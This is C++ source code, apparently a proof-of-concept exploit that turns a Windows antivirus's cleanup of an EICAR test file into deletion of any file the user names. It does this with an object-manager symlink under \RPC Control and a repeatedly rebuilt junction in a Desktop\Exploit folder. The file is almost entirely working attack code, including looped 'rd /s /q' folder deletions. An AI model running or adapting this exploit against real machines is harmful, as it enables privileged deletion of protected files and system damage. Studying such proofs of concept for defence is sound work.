#include "stdafx.h"
#include "FileOpLock.h"
#include "ReparsePoint.h"
#include <string>
#include <sddl.h>
#include <iostream>
#include <Windows.h>
#include "CommonUtils.h"
#include "ntimports.h"
#include "typed_buffer.h"
#include <chrono>
#include <thread>
#include <filesystem>
#include <iostream>
#include <fstream>  
#include "Shlwapi.h"
#include "shlobj.h"
#include <strsafe.h>

#pragma comment( lib, "shlwapi.lib")

const char* targetfile;
char buffermsi[1024];

bool bSuccess = false;

wchar_t exploitFilePath[MAX_PATH];
wchar_t appDataDirPath[MAX_PATH];


std::wstring targetfw;
std::wstring targetfwDos;

std::wstring s2ws(const std::string& str)
{
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}

bool DoesFileExist(LPCWSTR lpszFilename)
{
	DWORD fileAttr = GetFileAttributes(lpszFilename);
	DWORD lastErr = GetLastError();
	return ((fileAttr != INVALID_FILE_ATTRIBUTES)
		&& (lastErr != ERROR_FILE_NOT_FOUND));
}

bool dirExists(LPCWSTR dirName_in)
{
	DWORD ftyp = GetFileAttributes(dirName_in);
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;   // this is a directory!

	return false;    // this is not a directory!
}

HANDLE CreateSymlink(HANDLE root, LPCWSTR linkname, LPCWSTR targetname)
{
	DEFINE_NTDLL(RtlInitUnicodeString);
	DEFINE_NTDLL(NtCreateSymbolicLinkObject);

	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING name;
	UNICODE_STRING target;

	fRtlInitUnicodeString(&name, linkname);
	fRtlInitUnicodeString(&target, targetname);

	InitializeObjectAttributes(&objAttr, &name, OBJ_CASE_INSENSITIVE, root, nullptr);

	HANDLE hLink;

	NTSTATUS status = fNtCreateSymbolicLinkObject(&hLink,
		SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &target);
	if (status == 0)
	{
		//DebugPrintf("Opened Link %ls -> %ls: %p\n", linkname, targetname, hLink);
		return hLink;
	}
	else
	{
		SetLastError(NtStatusToDosError(status));
		return nullptr;
	}
}


int main(int argc, const char* argv[])
{
	if (argc < 2) {
		printf("Usage: %s <file_to_delete> \n", argv[0]);
		exit(1);
	}
	wchar_t bufferSystem[1024];
	targetfile = argv[1];
	std::string targetf(targetfile);
	targetfw = L"\\??\\" + s2ws(targetf);
	targetfwDos = s2ws(targetf);

	const wchar_t* targetfww = targetfw.c_str();

	if (!PathFileExists(targetfw.c_str()))
	{
		wprintf(L"[-] File %s does not exist \n", targetfw.c_str());
		return 0;
	}

	WCHAR userHomePath[MAX_PATH];
	WCHAR exploitFilePath[MAX_PATH];
	if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userHomePath)))
	{
		printf("[-] Exiting... error - %d \n", GetLastError());
		return 0;
	}
	if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, exploitFilePath)))
	{
		printf("[-] Exiting... error - %d \n", GetLastError());
		return 0;
	}
	if (!PathAppend(userHomePath, L"Desktop\\Exploit"))
	{
		printf("[-] Exiting... error - %d \n", GetLastError());
		return 0;
	}


	if (!PathAppend(exploitFilePath, L"Desktop\\Exploit\\eicartest.exe"))
	{
		printf("[-] Exiting... error - %d \n", GetLastError());
		return 0;
	}


	HANDLE hret = CreateSymlink(nullptr, L"\\RPC Control\\eicartest.exe", targetfww);
	if ((NULL) == hret || (hret == INVALID_HANDLE_VALUE))
	{
		printf("[-] Failed creating symlink index %d ", GetLastError());
		return 0;
	}

	//running in the loop
	while (TRUE) {
		wsprintf(bufferSystem, L"rd /s /q %s 2>NUL", userHomePath);
		_wsystem(bufferSystem);
		wsprintf(bufferSystem, L"md %s", userHomePath);
		_wsystem(bufferSystem);
		wsprintf(bufferSystem, L"echo X5O!P%%@AP[4\\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*> %s", exploitFilePath);
		_wsystem(bufferSystem);
		wsprintf(bufferSystem, L"rd /s /q %s 2>NUL", userHomePath);
		_wsystem(bufferSystem);
		wsprintf(bufferSystem, L"md %s", userHomePath);
		_wsystem(bufferSystem);
		wprintf(L"[+] Creating mountpoint from %s to target \n", userHomePath);

		if (!ReparsePoint::CreateMountPoint(userHomePath, L"\\RPC Control", L""))
		{
			printf("[+] Big Faiiilll \n");
		}

		printf("[+] OUT -> junction created \n");

	}

	/*
	OFSTRUCT openstruct;
	HFILE openhandle;
	openhandle = OpenFile("C:\\Users\\0day\\sym_testing\\test\\config.txt", &openstruct, 0x00000200);
	if (openhandle == HFILE_ERROR) {
		std::cout << "[+] Delete file fails \n";
	}
	CloseHandle(&openstruct);
	*/
	std::cout << "Keep the process running\n";
	std::this_thread::sleep_for(std::chrono::milliseconds(9000000));
	return 0;
}
